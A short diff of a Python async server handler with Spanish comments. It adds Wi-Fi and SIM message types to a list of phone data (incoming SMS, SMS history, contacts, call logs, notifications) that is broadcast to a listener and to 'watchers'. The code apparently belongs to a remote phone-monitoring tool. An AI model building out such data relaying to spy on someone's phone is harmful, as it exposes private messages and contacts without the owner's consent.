@@ -231,7 +231,8 @@ async def handle(request):
                     #   SMS_IN|    → SMS entrante en tiempo real
                     # Mensajes que van a listener Y a todos los watchers
                     BROADCAST = ("INFO|", "NOTIF|", "CALL_EVENT|", "SMS_IN|",
-                                 "CONTACTS|", "SMS_HISTORY|", "CALL_LOG|")
+                                 "CONTACTS|", "SMS_HISTORY|", "CALL_LOG|",
+                                 "WIFI|", "SIM|")
                     if any(txt.startswith(p) for p in BROADCAST):
                         if txt.startswith("INFO|"):
                             last_info[code] = txt
